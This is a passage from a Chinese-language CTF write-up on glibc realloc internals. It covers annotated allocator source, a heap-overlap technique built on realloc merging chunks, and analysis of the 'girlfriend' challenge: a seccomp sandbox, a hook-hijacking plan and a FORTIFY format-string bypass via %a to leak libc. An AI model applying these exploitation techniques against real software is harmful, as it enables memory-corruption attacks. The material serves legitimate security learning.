class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过一个<code>demo</code>来加深一下印象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">realloc</span>(p,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc realloc.c -o realloc -no-pie</span></span><br></pre></td></tr></table></figure><p><code>gdb</code>在<code>main</code>函数下断点之后单步走完<code>call   malloc@plt &lt;malloc@plt&gt;</code>，可以看到正常的创建了一个堆块：</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/1.png" class=""><p>再往下走完<code>call   realloc@plt &lt;realloc@plt&gt;</code>，再次查看的时候，它已经被<code>free</code>了：</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/2.png" class=""><p>往下走就是另一个特性，当<code>oldmem</code>为0，就调用<code>__libc_malloc</code>，也就是平时所说的<code>malloc</code>函数的入口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> __libc_malloc (bytes);</span><br></pre></td></tr></table></figure><p>稍微改一下上面的<code>demo</code>来重新验证一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p,*q;</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">realloc</span>(q,<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc realloc.c -o realloc -no-pie</span></span><br></pre></td></tr></table></figure><p>调试过程和上面的一样，结果同样没有任何毛病：</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/3.png" class=""><p>再往下就是<code>mmap</code>的分配方式，本文重点不在此出，直接看下面的<code>_int_realloc</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br></pre></td></tr></table></figure><p>下面是 <code>_int_realloc</code>的源码，已经做好了注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>*</span><br><span class="line">_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">     INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//首先是检查oldmem size和next chunk的大小是否合法</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (oldp) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (oldsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;realloc(): invalid old size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, oldp);</span><br><span class="line"></span><br><span class="line">  assert (!chunk_is_mmapped (oldp));</span><br><span class="line"></span><br><span class="line">  next = chunk_at_offset (oldp, oldsize);</span><br><span class="line">  INTERNAL_SIZE_T nextsize = chunksize (next);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (next) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;realloc(): invalid next size&quot;</span>);</span><br><span class="line">      </span><br><span class="line">  <span class="comment">//判断oldsize是不是已经大于要分配的</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (oldsize) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      newp = oldp;</span><br><span class="line">      newsize = oldsize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//如果堆块和top chunk相邻，就直接从top chunk中分割出来</span></span><br><span class="line">      <span class="keyword">if</span> (next == av-&gt;top &amp;&amp;</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          av-&gt;top = chunk_at_offset (oldp, nb);</span><br><span class="line">          set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">          check_inuse_chunk (av, oldp);</span><br><span class="line">          <span class="keyword">return</span> chunk2mem (oldp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//如果下一个堆块是空闲的且大小合适，就直接将它两个合并成一个大的堆块</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (next != av-&gt;top &amp;&amp;</span><br><span class="line">               !inuse (next) &amp;&amp;</span><br><span class="line">               (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">               (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          newp = oldp;</span><br><span class="line">          unlink (av, next, bck, fwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*如果又没有和top chunk相邻，下一个堆块也不合适，就直接malloc出来一个，并将原堆块的内容复制过去，最后把原来的堆块free掉*/</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             Avoid copy if newp is next chunk after oldp.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          <span class="keyword">if</span> (newp == next)</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              copysize = oldsize - SIZE_SZ;</span><br><span class="line">              s = (INTERNAL_SIZE_T *) (chunk2mem (oldp));</span><br><span class="line">              d = (INTERNAL_SIZE_T *) (newmem);</span><br><span class="line">              ncopies = copysize / <span class="keyword">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">              assert (ncopies &gt;= <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (ncopies &gt; <span class="number">9</span>)</span><br><span class="line">                <span class="built_in">memcpy</span> (d, s, copysize);</span><br><span class="line"></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  *(d + <span class="number">0</span>) = *(s + <span class="number">0</span>);</span><br><span class="line">                  *(d + <span class="number">1</span>) = *(s + <span class="number">1</span>);</span><br><span class="line">                  *(d + <span class="number">2</span>) = *(s + <span class="number">2</span>);</span><br><span class="line">                  <span class="keyword">if</span> (ncopies &gt; <span class="number">4</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                      *(d + <span class="number">3</span>) = *(s + <span class="number">3</span>);</span><br><span class="line">                      *(d + <span class="number">4</span>) = *(s + <span class="number">4</span>);</span><br><span class="line">                      <span class="keyword">if</span> (ncopies &gt; <span class="number">6</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                          *(d + <span class="number">5</span>) = *(s + <span class="number">5</span>);</span><br><span class="line">                          *(d + <span class="number">6</span>) = *(s + <span class="number">6</span>);</span><br><span class="line">                          <span class="keyword">if</span> (ncopies &gt; <span class="number">8</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              *(d + <span class="number">7</span>) = *(s + <span class="number">7</span>);</span><br><span class="line">                              *(d + <span class="number">8</span>) = *(s + <span class="number">8</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              _int_free (av, oldp, <span class="number">1</span>);</span><br><span class="line">              check_inuse_chunk (av, newp);</span><br><span class="line">              <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//整理一些额外的空间</span></span><br><span class="line"></span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">  remainder_size = newsize - nb;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (remainder_size &lt; MINSIZE)   <span class="comment">/* not enough extra to split off */</span></span><br><span class="line">    &#123;</span><br><span class="line">      set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_inuse_bit_at_offset (newp, newsize);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span>   <span class="comment">/* split remainder */</span></span><br><span class="line">    &#123;</span><br><span class="line">      remainder = chunk_at_offset (newp, nb);</span><br><span class="line">      set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      <span class="comment">/* Mark remainder as inuse so free() won&#x27;t complain */</span></span><br><span class="line">      set_inuse_bit_at_offset (remainder, remainder_size);</span><br><span class="line">      _int_free (av, remainder, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, newp);</span><br><span class="line">  <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来重点看一下这一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果下一个堆块是空闲的且大小合适，就直接将它两个合并成一个大的堆块</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (next != av-&gt;top &amp;&amp;</span><br><span class="line">         !inuse (next) &amp;&amp;</span><br><span class="line">         (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">         (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">&#123;</span><br><span class="line">    newp = oldp;</span><br><span class="line">    unlink (av, next, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例题就是利用这点来做堆叠的，为什么这么说呢？思考如下场景，如果<code>chunk1</code>存在堆溢出可以修改到<code>chunk2</code>的<code>size</code>，在这里假设改成0x221，那么下次再申请0x200的大小的时候，<code>chunk2</code>的堆块就会被申请到，但是此时的<code>chunk2</code>的<code>size</code>已经变成了0x220，也就是说<code>chunk2</code>里面还有0x20大小没分配出去，所以当我再次去扩大它的大小的时候就会像上面的那段代码一样直接将下一个堆块合并，也就是吞并了下一个堆块0x20的大小，就拥有了修改它<code>fd</code>指针的能力！</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/11.png" class=""><p>如果还不是很明白，再通过几张图片来巩固一下：</p><ol><li>首先修改<code>chunk2</code>的<code>size</code>为0x221，它将把下一个<code>chunk</code>的<code>head</code>包括进去：</li></ol><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/12.png" class=""><p>2.申请0x200的大小：</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/13.png" class=""><p>3.对<code>chunk2</code>进行扩充：</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/14.png" class=""><p>下面是最后一个特性，当对<code>newp</code>没有成功的扩充的时候（即<code>bin</code>中没有合适的堆块），会直接重新分配一个新的堆块，并将原来堆块的内容复制到新的堆块当中，再将原来的堆块<code>free</code>掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (newp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, <span class="number">2</span>, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      <span class="keyword">if</span> (newp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class="line">          _int_free (ar_ptr, oldp, <span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul><li>当<code>size</code>为0，就等于<code>free()</code>函数，同时返回值为NULL</li><li>当指针为0，<code>size</code>大于0，就等于<code>malloc()</code>函数</li><li><code>size</code>小于等于原来的<code>size</code>，则在原堆块上缩小，多余的大小<code>free()</code>掉</li><li><code>size</code>大于原来的<code>size</code>，如果<code>bin</code>中有多余的堆块就进行扩充，没有多余的堆块则重新分配新的堆块，并将内容复制到新的堆块中，然后再将原来的堆块<code>free()</code>掉</li></ul><h3 id="广东省强网杯–girlfriend"><a href="#广东省强网杯–girlfriend" class="headerlink" title="广东省强网杯–girlfriend"></a>广东省强网杯–<code>girlfriend</code></h3><h4 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>保护全开，同时还开启了<code>FORTIFY</code>来检测格式化字符串漏洞，只能打<code>xxx_hook</code>来<code>getshell</code>或者<code>orw</code></p><h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><p>IDA打开，满满的全是画指令，去除方法如下：</p><p>选中下面的画指令的开头，选择菜单<code>Edit -&gt; Patch program -&gt; Assamble</code>，将下面的画指令全部改成<code>nop</code>，之后回到函数的开头，对着函数名按下<code>u</code>和<code>p</code>，也就是让<code>IDA</code>重新分析此处，其他地方如法炮制，全部修改完成之后就可以正常的<code>f5</code>啦！（有些地方是需要重新选中再进行重新分析的，也就是从它开始到<code>sub_xxx  endp</code>的地方）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call    $+5</span><br><span class="line">add     [rsp+18h+var_18], 6</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>修复完之后，开头就是沙箱，那基本思路就定调了，就是泄露<code>libc</code>-&gt;劫持<code>xxx_hook</code>为<code>setcontext+53</code>进行栈迁移，最后再进行<code>orw</code>！（为了阅读方便已经为部分函数重命名了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到下一个函数，此函数询问<code>Do you have grilfriend ? </code>并给出两个选项，先来看看<code>v1 == N</code>里面的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_funtion</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====welcome to the game=====&quot;</span>);</span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">&quot;============================&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Do you have grilfriend ? &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    v1 = read_0();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="string">&#x27;N&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;what a bad mood++++&quot;</span>);</span><br><span class="line">      result = backdoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invaild&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      chunk_prt = <span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;please buy gifts for her+++++&quot;</span>);</span><br><span class="line">      result = heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到里面存在格式化字符串漏洞，之前讲到它开启了<code>FORTIFY</code>来检测，但是还是有办法绕过的！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_EA6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;why ? reason&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">5uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, buf, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;new a grilfriend&quot;</span>);</span><br><span class="line">  heap();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看看<code>FORTIFY</code>是怎么样来保护的：</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/26.png" class="" width="26"><p>就是说定义此宏会导致执行一些轻量级检查，以在使用各种字符串和内存操作函数（例如<code>memcpy</code>，<code>memset</code>、<code>stpcpy</code>、<code>strcpy</code>、<code>strncpy</code>、<code>strcat</code>、<code>strncat</code>、<code>sprintf</code>、<code>snprintf</code>、<code>vsprintf</code>、 <code>vsnprintf</code>、<code>gets</code>、 及其宽字符变体）时检测一些缓冲区溢出错误</p><p>比如<code>printf</code>就变成了<code>printf_chk</code>，它将可以检查格式化字符串漏洞的特殊字符，就像下面这样</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/4.png" class=""><p>但它真的不能被利用吗？答案肯定是：否！既然不能用<code>%x$p</code>，那<code>%p</code>呢，实验之后确实可以，但它才往<code>buf</code>里面读入5个字节，也就是意味着只能输入<code>%p%p</code>就不能再输入了，尝试之后并不能泄露任何地址（泄露出两个<code>nul</code>）</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/5.png" class=""><p>既然它不限制<code>%()</code>，拿其他的试试，直到<code>%a</code>，泄露出了下面的内容，！成功获得<code>libc</code>：</p><img 